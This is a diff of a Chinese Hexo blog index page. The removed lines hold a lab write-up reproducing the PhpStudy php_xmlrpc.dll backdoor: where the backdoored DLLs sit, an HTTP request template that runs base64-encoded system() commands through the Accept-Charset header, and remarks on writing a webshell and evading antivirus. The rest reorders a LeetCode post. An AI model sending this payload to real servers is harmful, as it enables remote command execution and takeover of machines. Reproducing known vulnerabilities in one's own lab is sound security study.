@@ -302,54 +302,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="PhpStudy-RCE漏洞复现"><a href="#PhpStudy-RCE漏洞复现" class="headerlink" title="PhpStudy RCE漏洞复现"></a>PhpStudy RCE漏洞复现</h2><p>PhpStudy后门时间出现了挺长一阵子了，我一直没有进行复现，今天尝试复现一下。</p>
-<hr>
-<h4 id="查看漏洞是否存在"><a href="#查看漏洞是否存在" class="headerlink" title="查看漏洞是否存在"></a>查看漏洞是否存在</h4><p>(1)phpStudy20161103版本后门位置存在位置</p>
-<blockquote>
-<p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p>
-<p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p>
-</blockquote>
-<p>(2)phpStudy20180211后门位置存在于：</p>
-<blockquote>
-<p>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll</p>
-<p>*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll</p>
-</blockquote>
-<p>查找dll文件中的”@eval”</p>
-<p><img src="/2019/10/31/PhpStudy_RCE漏洞复现/Hexo\source\_posts\PhpStudy_RCE漏洞复现\1572531118563.png" alt="1572531118563"></p>
-<p>可见存在后门在169行</p>
-<blockquote>
-<p>顺便说一下，Windows的powershell无法使用grep，所以只能用Select-String进行替代。</p>
-</blockquote>
-<p>以下为PowerShell中可以替代grep的三种命令，but亲测findstr不能用。</p>
-<p><img src="/2019/10/31/PhpStudy_RCE漏洞复现/Hexo\source\_posts\PhpStudy_RCE漏洞复现\1572531356667.png" alt="1572531356667"></p>
-<blockquote>
-<p>findstr：           cat .\create.tf  |findstr alicloud_slb<br>where：            cat .\create.tf  |where {$_ -match “alicloud_slb”}<br>Select-String： Select-String “alicloud_slb” .\create.tf</p>
-</blockquote>
-<hr>
-<h4 id="搭建PhpStudy靶机环境"><a href="#搭建PhpStudy靶机环境" class="headerlink" title="搭建PhpStudy靶机环境"></a>搭建PhpStudy靶机环境</h4><p>首先在靶机搭建phpstudy网站，在攻击机看是否可以访问</p>
-<p><img src="/2019/10/31/PhpStudy_RCE漏洞复现/Hexo\source\_posts\PhpStudy_RCE漏洞复现\1572532128021.png" alt="1572532128021"></p>
-<p>攻击机开启bp进行抓包</p>
-<blockquote>
-<p>GET / HTTP/1.1</p>
-<p>Host: 192.168.179.1</p>
-<p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0</p>
-<p>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p>
-<p>Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p>
-<p>Accept-Encoding: gzip,deflate</p>
-<p>Accept-Charset:”commandbase64 string”</p>
-<p>Connection: close</p>
-<p>Upgrade-Insecure-Requests: 1</p>
-<p>Cache-Control: max-age=0</p>
-</blockquote>
-<p>出现RCE漏洞的地方即Accept-Charset参数</p>
-<p>system(“your command”);</p>
-<p>将想要执行的命令放到your command中，对整条命令进行base64编码，放入Accept-Charset即可执行命令。</p>
-<p>我连接超时了，结果发现是php_xmlrpc拓展没开，并且一定要保留请求体，在Cache-Control后面一定要至少敲两行回车，要不会请求超时。</p>
-<p><img src="/2019/10/31/PhpStudy_RCE漏洞复现/Hexo\source\_posts\PhpStudy_RCE漏洞复现\1572533721654.png" alt="1572533721654"></p>
-<p>然后直接一条龙，使用Phpstudy用户权限就是当前登陆用户权限，systeminfo看一波，netstat看一波端口，直接写webshell。(最近想再看看关于如何免杀，之前写的马msf12重编码依然被火绒拦……所以webshell这块之后再写)</p>
-<p>之后顺便把后门删了(懒得搭windows虚拟机的我冒险用物理机以身试险)</p>
-<p><img src="/2019/10/31/PhpStudy_RCE漏洞复现/Hexo\source\_posts\PhpStudy_RCE漏洞复现\1572534460297.png" alt="1572534460297"></p>
-
+              <h2 id="PhpStudy-RCE漏洞复现"><a href="#PhpStudy-RCE漏洞复现" class="headerlink" title="PhpStudy RCE漏洞复现"></a>PhpStudy RCE漏洞复现</h2><p>PhpStudy后门时间出现了挺长一阵子了，我一直没有进行复现，今天尝试复现一下。<br></p>
+          
       
     </div>
     
@@ -362,6 +316,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a   href="/2019/10/31/PhpStudy_RCE漏洞复现/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -589,75 +547,6 @@
 
 
   
-    <article id="pages-两数之和" class="article article-type-pages" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2019/10/14/两数之和/" class="article-date">
-      <time datetime="2019-10-14T15:08:24.000Z" itemprop="datePublished">2019-10-14</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2019/10/14/两数之和/">两数之和</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/two-sum/</a></strong></p>
-<hr>
-<blockquote>
-<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。<br>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。<br></p></blockquote>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LeetCode刷题笔记/">LeetCode刷题笔记</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2019/10/14/两数之和/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
     <article id="pages-sqlsever反弹注入" class="article article-type-pages" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -774,6 +663,75 @@
       
         <p class="article-more-link">
           <a   href="/2019/10/14/整数反转/#more">查看更多 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="pages-两数之和" class="article article-type-pages" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2019/10/14/两数之和/" class="article-date">
+      <time datetime="2019-10-14T15:08:24.000Z" itemprop="datePublished">2019-10-14</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2019/10/14/两数之和/">两数之和</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/two-sum/</a></strong></p>
+<hr>
+<blockquote>
+<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。<br>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。<br></p></blockquote>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LeetCode刷题笔记/">LeetCode刷题笔记</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a   href="/2019/10/14/两数之和/#more">查看更多 >></a>
         </p>
       
       <div class="clearfix"></div>
